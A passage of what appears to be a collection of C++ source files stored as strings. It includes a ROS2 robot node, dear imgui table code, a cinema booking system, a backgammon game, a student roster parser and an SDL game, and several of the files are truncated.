RCLCPP_DEBUG(aNode->get_logger(),\"Enable Motors\");\n    robot->enableMotors();\n\n    auto aNode = std::make_shared<ariaNode>(&forwardSpeed, &rotationSpeed);\n    RCLCPP_DEBUG(aNode->get_logger(),\"Before Spin!...\");\n\n    /*\n     *   Aria does not like to run in a ros node therefore we run a while loop\n     *   that continuously spins the node to update velocities which are \n     *   then sent using the normal Aria commands.\n    */\n    while (!stopRunning) {\n        rclcpp::spin_some(aNode);\n        // RCLCPP_DEBUG(aNode->get_logger(), \"sending motor command.\");\n            robot->lock();\n            robot->setVel(forwardSpeed * 500);\n            robot->setRotVel(rotationSpeed * 50);\n            robot->unlock();\n            // RCLCPP_DEBUG(aNode->get_logger(), \"motor command sent.\");\n            // RCLCPP_DEBUG(aNode->get_logger(), \"forward speed is now %f.\", forwardSpeed);\n            // RCLCPP_DEBUG(aNode->get_logger(), \"rotational speed is now %f.\", rotationSpeed);\n    }\n    RCLCPP_DEBUG(aNode->get_logger(), \"After Spin\");\n\n    robot->disableMotors();\n    robot->stopRunning();\n    // wait for the thread to stop\n    robot->waitForRunExit();\n\n    // exit\n    RCLCPP_DEBUG(aNode->get_logger(), \"ending Aria node\");\n    Aria::exit(0);\n    return 0;\n}\n",
    "// dear imgui, v1.90.2 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableBeginContextMenuPopup()\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//  ",
    "#include<iostream>\n\nusing namespace std;\n\nint main(){\n    cout<<\"This is tutorial 9\"<<endl;\n\n    int age;\n    cout<< \"Please ENter your age\"<<endl;\n    cin>>age;\n\n    // if (age<18){\n\n    //     string name;\n    //     cout<<\"Please ENter your name\"<<endl;\n    //     cin>>name;\n    //     string Luficer = \"Luficer\";\n\n    //     if (name == Luficer){\n    //         cout<<\"You can come\"<<endl;\n    //     }\n    //     else{\n    //         cout<< \"You can't , you are not LUFICER\"<<endl;\n    //     }\n\n\n    // }\n\n    // else if (age==18){\n    //     cout<<\"You  are okay now\"<<endl;\n    // }\n\n    // else {\n    //     cout<<\"You can come to the party\"<<endl;\n    // }\n\n\n    // ?Switch statements\n    switch (age)\n    {\n    case 18:\n        cout<<\"You are 18 years\";\n        break;\n    \n    default:\n        if (age<18){\n\n        string name;\n        cout<<\"Please ENter your name\"<<endl;\n        cin>>name;\n        string Luficer = \"Luficer\";\n\n        if (name == Luficer){\n            cout<<\"You can come\"<<endl;\n        }\n        else{\n            cout<< \"You can't , you are not LUFICER\"<<endl;\n        }\n        break;\n    }\n    return 0;\n}",
    "#include \"Theatre.h\"\n\nTheatre::Theatre(vector<Movie> m)\n{\n\tmovies = m;\n\tconstructBookingFiles();\n\tpopulateTicketQueue();\n\tpopulatesnackQueue();\n\n}\n\nvoid Theatre::populateTicketQueue()\n{\n\tticketCustomers = rand() % 10;\n\tfor (int i = 0; i < ticketCustomers; i++)\n\t{\n\t\tint service = rand() % 5 + 1;\n\t\tticketQueue.push(service);\n\t\tticketWaitingTime += service;\n\t}\n}\n\nvoid Theatre::populatesnackQueue()\n{\n\tsnackCustomers = rand() % 10;\n\tfor (int i = 0; i < snackCustomers; i++)\n\t{\n\t\tint service = rand() % 5 + 1;\n\t\tsnackQueue.push(service);\n\t\tsnackWaitingTime += service;\n\t}\n}\n\nint Theatre::getTicketWaitingTime()\n{\n\treturn ticketWaitingTime;\n}\n\nint Theatre::getTicketCustomers()\n{\n\treturn ticketCustomers;\n}\n\nint Theatre::getSnackCustomers()\n{\n\treturn snackCustomers;\n}\n\nint Theatre::getSnackWaitingTime()\n{\n\treturn snackWaitingTime;\n}\n\nqueue<int> Theatre::getTicketQueue()\n{\n\treturn ticketQueue;\n}\n\nqueue<int> Theatre::getSnackQueue()\n{\n\treturn snackQueue;\n}\n\nvoid Theatre::joinTicketQueue()\n{\n\tticketQueue.push(0); //No waiting time applies to customer standing in this position\n}\n\nvoid Theatre::joinSnackQueue()\n{\n\tsnackQueue.push(0); //No waiting time applies to customer standing in this position\n}\n\nvoid Theatre::bookSeat()\n{\n\tint n, d, t; string time;\n\tdo\n\t{\n\t\tcout << \"Choose Movie You Wish to Book - Enter Corresponding Number: \" << endl;\n\t\tfor (int i = 0; i < movies.size(); i++)\n\t\t{\n\t\t\tcout << i + 1 << \": \" << movies[i].getName() << endl;\n\t\t}\n\t\tdo\n\t\t{\n\t\t\tcin >> n;\n\t\t\tif (n > movies.size() || n < 1) cout << \"Invalid Input\" << endl;\n\t\t} while (n > movies.size() || n < 1);\n\t\tcout << \"Choose Day - Enter Corresponding Number: \" << endl;\n\t\tcout << \"1: Sunday\" << endl;\n\t\tcout << \"2: Monday\" << endl;\n\t\tcout << \"3: Tuesday\" << endl;\n\t\tcout << \"4: Wednesday\" << endl;\n\t\tcout << \"5: Thursday\" << endl;\n\t\tcout << \"6: Friday\" << endl;\n\t\tcout << \"7: Saturday\" << endl;\n\n\t\tcin >> d;\n\n\n\t\tcout << \"Choose Time - Enter Corresponding Number: \" << endl;\n\t\tfor (int i = 0; i < movies[n - 1].getTimes().size(); i++)\n\t\t{\n\t\t\tcout << i + 1 << \": \" << movies[n - 1].getTimes()[i] << endl;\n\n\t\t}\n\t\tcin >> t;\n\t\ttime = movies[n - 1].getTimes()[t - 1];\n\n\t\tif (movies[n - 1].soldOut(time, d)) cout << \"Show is Sold Out: Pick a different Show: \";\n\t}\n\n\twhile (movies[n - 1].soldOut(time, d));\n\n\n\tint numSeats;\n\tcout << \"How Many Seats Would You Like to Book: \" << endl;\n\tcin >> numSeats;\n\n\n\t// Construct file name\n\tstring fileName = movies[n - 1].getName() + \"_\" + to_string(d) + \".txt\";\n\n\t// Open file for reading and appending\n\tifstream inputFile(fileName);\n\tofstream outputFile(fileName, ios::app);\n\tif (!inputFile.is_open() || !outputFile.is_open()) {\n\t\tcout << \"Error opening file \" << fileName << endl;\n\t\treturn;\n\t}\n\n\tfor (int i = 0; i < numSeats; i++)\n\t{\n\t\tmovies[n - 1].displayBookingInfo(time, d);\n\t\tstring seat;\n\t\tbool seatBooked = true; // Initialize as true to enter the loop\n\t\twhile (seatBooked) {\n\t\t\tcout << \"Choose Seat to Book: \";\n\t\t\tcin >> seat;\n\t\t\tcout << endl;\n\t\t\twhile (!movies[n - 1].validateSeat(seat))\n\t\t\t{\n\t\t\t\tcout << \"Invalid Seat: Try Again.\" << endl;\n\t\t\t\tcin >> seat;\n\t\t\t}\n\n\t\t\t// Read file line by line\n\t\t\tstring booking = seat + \" \" + time;\n\t\t\tstring line;\n\t\t\tseatBooked = false; // Reset to false for each iteration\n\t\t\tinputFile.clear(); // Clear error flags\n\t\t\tinputFile.seekg(0, ios::beg); // Move file pointer to the beginning\n\t\t\twhile (getline(inputFile, line)) {\n\t\t\t\t// Check if the line contains the time\n\t\t\t\tif (line == booking) {\n\t\t\t\t\tcout << \"This seat is already booked for the selected time. Pick a different Seat\" << endl;\n\t\t\t\t\tseatBooked = true;\n\t\t\t\t\tbreak; // Exit loop if seat is booked\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (!seatBooked)\n\t\t\t{\n\t\t\t\toutputFile << booking << endl;\n\t\t\t\tmovies[n - 1].reserveSeat(time, d, seat);\n\t\t\t\tcout << \"Seat Booked Successfully!\" << endl<<endl;\n\t\t\t}\n\t\t}\n\t\t\n\t}\n\tmovies[n - 1].displayBookingInfo(time, d);\n\t// Close input file\n\tinputFile.close();\n\toutputFile.close();\n}\n\nvoid Theatre::cancelReservation()\n{\n\tint n, d, t; string time;\n\t\n\tcout << \"Choose Movie You Wish to Cancel Reservation For - Enter Corresponding Number: \" << endl;\n\tfor (int i = 0; i < movies.size(); i++)\n\t{\n\t\tcout << i + 1 << \": \" << movies[i].getName() << endl;\n\t}\n\n\tdo\n\t{\n\t\tcin >> n;\n\t\tif (n > movies.size() || n < 1) cout << \"Invalid Input\" << endl;\n\t} while (n > movies.size() || n < 1);\n\tcout << \"Choose Day - Enter Corresponding Number: \" << endl;\n\tcout << \"1: Sunday\" << endl;\n\tcout << \"2: Monday\" << endl;\n\tcout << \"3: Tuesday\" << endl;\n\tcout << \"4: Wednesday\" << endl;\n\tcout << \"5: Thursday\" << endl;\n\tcout << \"6: Friday\" << endl;\n\tcout << \"7: Saturday\" << endl;\n\n\tcin >> d;\n\n\n\tcout << \"Choose Time - Enter Corresponding Number: \" << endl;\n\tfor (int i = 0; i < movies[n - 1].getTimes().size(); i++)\n\t{\n\t\tcout << i + 1 << \": \" << movies[n - 1].getTimes()[i] << endl;\n\n\t}\n\tcin >> t;\n\ttime = movies[n - 1].getTimes()[t - 1];\n\tif (movies[n - 1].showEmpty(time,d))\n\t{\n\t\tcout << \"Nothing is Booked in this Show!\" << endl; return;\n\t}\n\n\tmovies[n - 1].displayBookingInfo(time, d);\n\tstring sea",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <conio.h> \n#include <stdio.h>\n#include <stdlib.h>\n#include <windows.h>\n#include <string.h>\n#include <string>\n\n#define PLAYER1_SYM '1'\n#define PLAYER2_SYM '2'\n#define BLANK       '-'\n\nusing namespace std;\n\nvoid openingRoll(int* whoStarts);\nvoid setPawnsDefault(struct GameState* gameState);\nvoid printMenu(struct GameState* gameState);\nvoid printFieldHighlights(int x, bool highlight[24]);\nvoid printBoard(struct GameState* gameState, bool highlight[24]);\nvoid fieldDecryption(int* field);\nint getNumericInput(struct GameState* gameState, int field, int pawn, bool highlight[24], int whoStarts);\nvoid clearScreen();\nvoid highlightFields(char x, struct GameState* gameState, bool highlight[24]);\nvoid undoHighlight(char x, struct GameState* gameState, bool highlight[24]);\nvoid saveGameState(const char* filename, struct GameState* gameState);\nvoid loadGameState(const char* filename, struct GameState* gameState);\nint isFileEmpty(const char* filename, struct GameState* gameState);\nvoid ifDeadPawns(int field, int pawn, struct GameState* gameState, bool highlight[24], int whoStarts);\nint rollingDie(struct GameState* gameState);\nvoid endingMove(int field, int pawn, struct GameState* gameState, bool highlight[24], int nextPlayer, int whoStarts);\nint pawnInput(int player, string board, struct GameState* gameState, int pawn, int field);\nint enterFieldNumber(int field, struct GameState* gameState, bool highlight[24], int pawn, int whoStarts);\nvoid endGame(struct GameState* gameState);\nvoid playerMovement(int field, int pawn, struct GameState* gameState, bool highlight[24], int whoStarts);\nvoid printMenuChoice();\nint getInput();\nvoid entryMenuChoice(int field, int pawn, struct GameState* gameState, bool highlight[24], int whoStarts);\n\nstruct GameState {\n    char topBoard[12][5];\n    char bottomBoard[12][5];\n    int whoseTurn;\n    int p1DeadPawns;\n    int p2DeadPawns;\n    int p1BornPawns;\n    int p2BornPawns;\n};\n\nvoid openingRoll(int* whoStarts) {\n    int rollOne = rand() % 6 + 1;\n    int rollTwo = rand() % 6 + 1;\n    if (rollOne > rollTwo) {\n        (*whoStarts) = 1;\n    }\n    else if (rollOne == rollTwo) {\n        openingRoll(whoStarts);\n    }\n    else {\n        (*whoStarts) = 2;\n    }\n}\n\nvoid setPawnsDefault(struct GameState* gameState) {\n    gameState->p1DeadPawns = 0;\n    gameState->p2DeadPawns = 0;\n    gameState->p1BornPawns = 0;\n    gameState->p2BornPawns = 0;\n    //two dimensional array\n    for (int j = 0; j < 5; j++) {\n        for (int i = 0; i < 12; i++) {\n            gameState->topBoard[i][j] = BLANK;\n            if (i == 0 || (i == 11 && j < 2)) {\n                gameState->topBoard[i][j] = PLAYER1_SYM;\n            }\n            if ((i == 4 && j < 3) || i == 6) {\n                gameState->topBoard[i][j] = PLAYER2_SYM;\n            }\n        }\n    }\n    printf(\"\\n\");\n    for (int j = 0; j < 5; j++) {\n        for (int i = 0; i < 12; i++) {\n            gameState->bottomBoard[i][j] = BLANK;\n            if (i == 0 || (i == 11 && j > 2)) {\n                gameState->bottomBoard[i][j] = PLAYER2_SYM;\n            }\n            if ((i == 4 && j > 1) || i == 6) {\n                gameState->bottomBoard[i][j] = PLAYER1_SYM;\n            }\n        }\n    }\n}\n\nvoid printMenu(struct GameState* gameState) {\n    printf(\"     PRESS [S] AND ENTER TO SAVE GAME STATE   \\n\");\n    printf(\"  --------------------------------------------\\n\");\n    printf(\"  > PLA1 - bornPawns: [%d] - deadPawns: [%d] <\\n\\n\", gameState->p1BornPawns, gameState->p1DeadPawns);\n    printf(\"  > PLA2 - bornPawns: [%d] - deadPawns: [%d] <\\n\", gameState->p2BornPawns, gameState->p2DeadPawns);\n    printf(\"  --------------------------------------------\\n\\n\");\n}\n\nvoid printFieldHighlights(int x, bool highlight[24]) {\n    if (x == 1) {\n        printf(\"  \");\n        for (int i = 0; i <= 5; i++) {\n            if (highlight[i] == true) {\n                printf(\"  #\");\n            }\n            else {\n                printf(\"   \");\n            }\n        }\n        printf(\"     \");\n        for (int i = 6; i <= 11; i++) {\n            if (highlight[i] == true) {\n                printf(\"  #\");\n            }\n            else {\n                printf(\"   \");\n            }\n        }\n        printf(\" \\n\");\n    }\n\n    else if (x == 2) {\n        printf(\"\\n  \");\n        for (int i = 12; i <= 17; i++) {\n            if (highlight[i] == true) {\n                printf(\"  #\");\n            }\n            else {\n                printf(\"   \");\n            }\n        }\n        printf(\"     \");\n        for (int i = 18; i <= 23; i++) {\n            if (highlight[i] == true) {\n                printf(\"  #\");\n            }\n            else {\n                printf(\"   \");\n            }\n        }\n        printf(\" \\n\");\n    }\n}\n\nvoid printBoard(struct GameState* gameState, bool highlight[24]) {\n    printMenu(gameState);\n    printFieldHighlights(1, highlight);\n    printf(\"   13 14 15 16 17 18      19 20 21 22 23 24  \\n\");//3 5 1; every number print sp",
    "#include \"SFML/Graphics/PrimitiveType.hpp\"\n#include \"SFML/Graphics/VertexArray.hpp\"\n#include \"SFML/System/Vector3.hpp\"\n#include <iostream>\n#include <SFML/Window.hpp>\n#include <SFML/Graphics.hpp>\n\nint main(void)\n{\n    sf::VertexArray drawPallette(sf::Points);\n    \n\n    auto aspectRatio = 16.0f / 9.0f;\n    int imageWidth = 400;\n\n    int imageHeight = static_cast<int>(imageWidth / aspectRatio);\n    imageHeight = (imageHeight < 1) ? 1 : imageHeight;\n\n    auto focalLength = 1.0f;\n    auto viewportHeight = 2.0f;\n    // auto viewportWidth = aspectRatio * viewportHeight;\n    auto viewportWidth = viewportHeight * (static_cast<float>(imageWidth / imageHeight));\n    auto cameraOrigin = sf::Vector3f(0.0f, 0.0f, 0.0f);\n\n    auto viewportU  = sf::Vector3f(viewportWidth, 0.0f, 0.0f);\n    auto viewportV  = sf::Vector3f(0.0f, -viewportHeight, 0.0f);\n\n    auto pixelDeltaU = viewportU / static_cast<float>(imageWidth);\n    auto pixelDeltaV = viewportV / static_cast<float>(imageHeight);\n\n    auto viewportUpperLeft = cameraOrigin - sf::Vector3f(0,0, focalLength) - (viewportU / 2.0f) + (viewportV / 2.0f);\n    auto pixel00Loc = viewportUpperLeft + 0.5f * pixelDeltaU - 0.5f * pixelDeltaV;\n\n    sf::RenderWindow window(sf::VideoMode(800, 600), \"SFML works!\");\n    window.setFramerateLimit(60);\n\n    while (window.isOpen())\n    {\n        sf::Event event;\n        while (window.pollEvent(event))\n        {\n            if (event.type == sf::Event::Closed)\n                window.close();\n        }\n\n        window.clear();\n        window.draw(drawPallette);\n        window.display();\n    }\n\n    return 0;\n}",
    "// world.h\n\n#ifndef WORLD_H\n#define WORLD_H\n\n#include <vector>\n#include <string>\n\nclass World {\npublic:\n    World();\n\n    void loadWorld(const std::string& filename);\n    void loadMissions(const std::string& filename);\n\n    void render();\n\nprivate:\n    // Define any data members you need here, such as mission objects, world geometry, etc.\n    std::vector<std::string> missions;\n    // Define other data members as needed\n};\n\n#endif // WORLD_H\ncpp\nCopy code\n// world.cpp\n\n#include \"world.h\"\n#include <iostream>\n\nWorld::World() {\n    // Initialize any member variables here\n}\n\nvoid World::loadWorld(const std::string& filename) {\n    // Load world geometry from file\n    std::cout << \"Loading world: \" << filename << std::endl;\n    // Implement world loading logic here\n}\n\nvoid World::loadMissions(const std::string& filename) {\n    // Load missions and objectives from file\n    std::cout << \"Loading missions: \" << filename << std::endl;\n    // Implement mission loading logic here\n}\n\nvoid World::render() {\n    // Render the world geometry\n    // For now, let's just render a green plane\n    glBegin(GL_QUADS);\n    glColor3f(0.0f, 1.0f, 0.0f);\n    glVertex3f(-10.0f, 0.0f, -10.0f);\n    glVertex3f(-10.0f, 0.0f, 10.0f);\n    glVertex3f(10.0f, 0.0f, 10.0f);\n    glVertex3f(10.0f, 0.0f, -10.0f);\n    glEnd();\n}\n",
    "//\n//  roster.cpp\n//  ClassRoster2\n//\n//  Created by Parvaty Chery on 2024-04-23.\n//\n\n#include \"roster.hpp\"// including the roster header file to use the Roster class\n#include <iostream>\n#include <sstream>\n#include <iomanip>\n#include <string>\n\nusing namespace std;\n\n//this is the function to parse the student data and add it to the roster\nvoid Roster::parse(string allstudentdata){\n    \n    \n    //will allow to find and extract each piece of info from the input string\n    \n    //first we find the position of the first comma\n    std::string::size_type rightside = allstudentdata.find(','); // this finds the comma\n    string studentid = allstudentdata.substr(0, rightside);\n    //second, it extracts the student ID from the beginning of teh string\n    \n    \n    //move on to the next comma in the data and find its position\n    std::string::size_type leftside = rightside + 1; // this moves past the previous comma\n    rightside = allstudentdata.find(',', leftside);\n    string firstname = allstudentdata.substr(leftside, rightside - leftside); //first name- extract the first name from the string\n    \n    //this process repeats for the last name, email and age and the degree program\n    \n    leftside = rightside + 1; // this keeps the loop going\n    rightside = allstudentdata.find(',', leftside);\n    string lastname = allstudentdata.substr(leftside, rightside - leftside); //last name\n    \n    leftside = rightside + 1; //keeps going\n    rightside = allstudentdata.find(',', leftside);\n    string emailaddress = allstudentdata.substr(leftside, rightside - leftside); //email address\n    \n    leftside = rightside + 1; // keeps going\n    rightside = allstudentdata.find(',', leftside);\n    int studentage = stoi(allstudentdata.substr(leftside, rightside - leftside));\n    \n    leftside = rightside + 1; // continue on to the next one\n    rightside = allstudentdata.find(',', leftside);\n    int daysforcourse1 = stod(allstudentdata.substr(leftside, rightside - leftside)); /*first element for days in course*/\n    leftside = rightside + 1; // continue on to the next one\n    rightside = allstudentdata.find(',', leftside);\n    int daysforcourse2 = stod(allstudentdata.substr(leftside, rightside - leftside)); /*second element for days in course*/\n    leftside = rightside + 1; // continue on to the next one\n    rightside = allstudentdata.find(\",\", leftside);\n    int daysforcourse3 = stod(allstudentdata.substr(leftside, rightside - leftside)); /*third element for days in course*/\n    \n    leftside = rightside + 1;\n    rightside = allstudentdata.find(\",\", leftside);\n    \n    DegreeProgram dp = SECURITY;//set the default program to SECURITY\n    if (allstudentdata[leftside] == 'S') {/*CHECKS IF THE FIRST CHARACTER AFTER THE COMMA IS S; THEN WE ADD ANOTHER IF CONDITION*/\n        \n        /*CHECKS IF THE NEXT CHARACTER IS E FOR SECURITY*/\n        if (allstudentdata[leftside + 1] == 'E') dp = SECURITY;\n        else if (allstudentdata[leftside + 1] == 'O') dp = SOFTWARE;\n        /*CHECKS IF THE NEXT CHARACTER IS 0 FOR SOFTWARE*/\n    } else if (allstudentdata[leftside] == 'N') {\n        dp = NETWORK;//CHECKS IF FIRST CHARACTER AFTER THE COMMA IS N FOR NETWORK\n    }\n    add(studentid, firstname, lastname, emailaddress, studentage, daysforcourse1, daysforcourse2, daysforcourse3, dp);//ADDING THE STUDENT TO THE ROSTER\n}\n    \n\n    \n\n\n\n void Roster::add(string studentID,string firstName,string lastName,string emailAddress,int age,int daysInCourse1, int daysInCourse2, int daysInCourse3, DegreeProgram degreeProgram){//FUNCTION TO ADD STUDENT TO THE ROSTER\n                                                \n     int daysinarray[3] = {daysInCourse1,daysInCourse2,daysInCourse3};\n// THE ARRAY STORES THE DAYS SPENTS IN EACH COURSE\n\n    \n     classRosterArray[++lastindex] = new Student(studentID, firstName, lastName, emailAddress,age,daysinarray,degreeProgram);/*ADDING THE STUDENT TO THE CLASSROSTERARRAY*/\n        \n    }\n\nvoid Roster::remove(string studentID) {\n    bool studentfound = false; /*initialize a boolean to track if the student was found*/\n    for (int i = 0; i <= lastindex; i++) { // doing a for loop\n        if (classRosterArray[i]->getStudentID() == studentID) {/*checking if the studentid matches the one to remove*/\n            delete classRosterArray[i]; // Delete the student object from memory\n            studentfound = true;\n            for (int j = i; j < lastindex; j++) {\n                classRosterArray[j] = classRosterArray[j + 1];\n            }/*shift the remaining students to fill the gaps and move the pointers down in the array*/\n            classRosterArray[lastindex] = nullptr; // Nullify the last element\n            lastindex--;\n            break;\n        }\n    }\n    if (studentfound) {\n        cout << \"Student with ID: \" << studentID << \" found and removed.\" << endl;\n    } else {\n        cout << \"Error: Student with ID \" << studentID << \" not found.\" << endl;\n    }\n}\n\n\nvoid Roster::printAll()\n{//prints out all students in the roster\n    St",
    "\ufeff#include <iostream>\n#include <SDL.h>\n#include <SDL_image.h>\n#include <SDL_mixer.h>;\n#include <SDL_ttf.h>;\n#include \"defs.h\"\n#include \"graphics.h\"\n#include <vector>\n#include \"game.h\"\n#include \"monster.h\";\n#include <cstdlib> // For rand() and srand()\n#include <ctime>   // For time()\n#include \"chaanimation.h\"\n#include <SDL_ttf.h>\n#include <string>\n#define FIRELIMIT 30\n#define FIREBALLLIMIT 4\n#include <fstream>\nusing namespace std;\n\nvoid logErrorAndExit(const char* msg, const char* error)\n{\n    SDL_LogMessage(SDL_LOG_CATEGORY_APPLICATION, SDL_LOG_PRIORITY_ERROR, \"%s: %s\", msg, error);\n    SDL_Quit();\n}\n\nSDL_Window* initSDL(int SCREEN_WIDTH, int SCREEN_HEIGHT, const char* WINDOW_TITLE)\n{\n    if (SDL_Init(SDL_INIT_EVERYTHING) != 0)\n        logErrorAndExit(\"SDL_Init\", SDL_GetError());\n\n    // SDL_Window* window = SDL_CreateWindow(WINDOW_TITLE, SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);\n     //full screen\n    SDL_Window* window = SDL_CreateWindow(WINDOW_TITLE, SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_FULLSCREEN_DESKTOP);\n    if (window == nullptr) logErrorAndExit(\"CreateWindow\", SDL_GetError());\n    if (!IMG_Init(IMG_INIT_PNG | IMG_INIT_JPG))\n        logErrorAndExit(\"SDL_image error:\", IMG_GetError());\n\n\n    return window;\n}\n\nSDL_Renderer* createRenderer(SDL_Window* window)\n{\n    SDL_Renderer* renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED |\n        SDL_RENDERER_PRESENTVSYNC);\n    //Khi ch\u1ea1y trong m\u00e1y \u1ea3o (v\u00ed d\u1ee5 ph\u00f2ng m\u00e1y \u1edf tr\u01b0\u1eddng)\n    //renderer = SDL_CreateSoftwareRenderer(SDL_GetWindowSurface(window));\n\n    if (renderer == nullptr) logErrorAndExit(\"CreateRenderer\", SDL_GetError());\n\n    SDL_SetHint(SDL_HINT_RENDER_SCALE_QUALITY, \"linear\");\n    SDL_RenderSetLogicalSize(renderer, SCREEN_WIDTH, SCREEN_HEIGHT);\n\n    return renderer;\n}\n\nvoid quitSDL(SDL_Window* window, SDL_Renderer* renderer)\n{\n    IMG_Quit();\n\n    SDL_DestroyRenderer(renderer);\n    SDL_DestroyWindow(window);\n    SDL_Quit();\n}\n\nvoid waitUntilKeyPressed()\n{\n    SDL_Event e;\n    while (true) {\n        if (SDL_PollEvent(&e) != 0 &&\n            (e.type == SDL_KEYDOWN || e.type == SDL_QUIT))\n            return;\n        SDL_Delay(50);\n    }\n}\n\n\nint main(int argc, char* argv[])\n{\n    srand(time(NULL));\n    Graphics graphics;\n    graphics.init();\n    SDL_Texture* background = loadTexture(\"img//map1.png\", graphics.renderer);\n    SDL_Texture* heart = loadTexture(\"img/heart.png\", graphics.renderer);\n    SDL_Texture* heartless = loadTexture(\"img/heartless.png\", graphics.renderer);\n    SDL_Texture* burning = loadTexture(\"img//Fire.png\",graphics.renderer);\n    SDL_Texture* keyimg = loadTexture(KEYIMAGE,graphics.renderer);\n    SDL_Texture* warning = loadTexture(\"img\\\\Warning.png\", graphics.renderer);\n    SDL_Texture* warninglane = loadTexture(\"img\\\\warninglane.png\", graphics.renderer);\n    SDL_Texture* chadial = loadTexture(\"img\\\\characterdialogue.png\", graphics.renderer);\n    bool scorednewhighscore;\n    dialogue dial;\n    Key key;\n    int fireballoc = 0;\n    key.x = 370;\n    key.y = 280;\n    key.locx= 408;\n    key.locy = 308;\n    int firestate = 0;\n    int fireballloc = 0;\n    //375//277\n    Sprite idle;\n    SDL_Texture* chatexture = graphics.loadTexture(CHARACTERFILE);\n    idle.init(chatexture, IDLE_FRAME, IDLE_CLIPS);\n    Sprite moveright;\n    moveright.init(chatexture, MOVERIGHT_FRAME, MOVERIGHT_CLIPS);\n    Sprite moveup;\n    moveup.init(chatexture, MOVEUP_FRAME, MOVEUP_CLIPS);\n    Sprite moveleft;\n    moveleft.init(chatexture, MOVELEFT_FRAME, MOVELEFT_CLIPS);\n    Sprite movedown;\n    movedown.init(chatexture, MOVEDOWN_FRAME, MOVEDOWN_CLIPS);\n    Sprite slashleft;\n    slashleft.init(chatexture, SLASHLEFT_FRAME, SLASHLEFT_CLIPS);\n    Sprite slashdown;\n    slashdown.init(chatexture, SLASHDOWN_FRAME, SLASHDOWN_CLIPS);\n    Sprite slashright;\n    slashright.init(chatexture, SLASHRIGHT_FRAME, SLASHRIGHT_CLIPS);\n    Sprite slashup;\n    slashup.init(chatexture, SLASHUP_FRAME, SLASHUP_CLIPS);\n    Sprite chadeath;\n    chadeath.init(chatexture, CHADEATH_FRAME, CHADEATH_CLIPS);\n    Sprite slimeidle1;\n    SDL_Texture* slime = graphics.loadTexture(SLIMEFILE);\n    slimeidle1.init(slime, SLIME_IDLE_RIGHT_FRAME, SLIME_IDLE_RIGHT_CLIPS);\n    Sprite slimeidle2;\n    slimeidle2.init(slime, SLIME_IDLE_LEFT_FRAME, SLIME_IDLE_LEFT_CLIPS);\n    Sprite slimeright1;\n    slimeright1.init(slime, SLIME_MOVE_RIGHT_FRAME, SLIME_MOVE_RIGHT_CLIPS);\n    Sprite slimeleft1;\n    slimeleft1.init(slime, SLIME_MOVE_LEFT_FRAME, SLIME_MOVE_LEFT_CLIPS);\n    Sprite slimeright2;\n    slimeright2.init(slime, 